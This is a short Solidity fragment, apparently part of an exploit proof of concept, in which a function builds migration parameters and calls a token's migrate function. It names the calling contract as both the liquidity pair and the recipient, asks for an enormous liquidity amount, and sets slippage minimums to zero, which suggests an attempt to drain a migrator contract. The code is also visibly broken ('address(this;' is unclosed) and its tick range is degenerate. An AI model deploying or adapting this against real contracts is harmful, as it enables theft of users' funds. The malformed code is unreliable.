    function callFunc() public {
        MigrateParams memory mig;
        mig.pair = address(this;
        mig.liquidityToMigrate = 40872475671826880538328523;
        mig.percentageToMigrate = 1;
        mig.token0 = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        mig.token1 = 0xC3afDe95B6Eb9ba8553cDAea6645D45fB3a7FAF5;
        mig.fee = 500;
        mig.tickLower = 100;
        mig.tickUpper = 100;
        mig.amount0Min = 0;
        mig.amount1Min = 0;
        mig.recipient = address(this);
        mig.deadline = 8888888898993;
        mig.refundAsETH = true;

        token.migrate(mig);
    }
